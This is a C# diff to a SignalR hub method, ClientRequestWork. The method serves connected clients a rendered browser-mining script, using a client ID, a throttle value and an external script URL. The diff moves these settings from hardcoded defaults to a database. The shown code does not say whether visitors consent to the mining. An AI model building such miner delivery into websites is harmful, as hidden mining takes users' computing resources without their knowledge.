@@ -524,15 +524,16 @@ namespace SignalRService.Hubs
         public async Task<WorkData> ClientRequestWork()
         {
             //default, in case nothin in db - and for delay / statusinterval which are not in db for now
-            var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
-            {
-                ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-                Throttle = "0.9",
-                ScriptUrl = "https://www.freecontent.date./W7KS.js",
-                StartDelayMs = 3000,
-                ReportStatusIntervalMs = 65000
-            };
+            //var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
+            //{
+            //    ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+            //    Throttle = "0.9",
+            //    ScriptUrl = "https://www.freecontent.date./W7KS.js",
+            //    StartDelayMs = 3000,
+            //    ReportStatusIntervalMs = 65000
+            //};
 
+            ViewModels.MinerConfigurationViewModel MinerConfigurationViewModel = new ViewModels.MinerConfigurationViewModel();
             var dbMinerConfig = db.MinerConfiurationModels.FirstOrDefault();
             if(dbMinerConfig == null)
             {
@@ -541,9 +542,7 @@ namespace SignalRService.Hubs
             }
             else
             {
-                MinerConfigurationViewModel.ClientId = dbMinerConfig.ClientId;
-                MinerConfigurationViewModel.Throttle = dbMinerConfig.Throttle.ToString();
-                MinerConfigurationViewModel.ScriptUrl = dbMinerConfig.ScriptUrl;
+                MinerConfigurationViewModel = dbMinerConfig.ToMinerConfigurationViewModel();
             }
            
             var data = Utils.RenderUtils.RenderMinerScript(MinerConfigurationViewModel.ClientId, MinerConfigurationViewModel.Throttle, MinerConfigurationViewModel.ScriptUrl, MinerConfigurationViewModel.StartDelayMs, MinerConfigurationViewModel.ReportStatusIntervalMs, true);
@@ -552,6 +551,8 @@ namespace SignalRService.Hubs
             wd.Script = data.ToString();
             return wd;
         }
+
+ 
 
         public async Task<MinerList> GetMinerlistInitialState()
         {
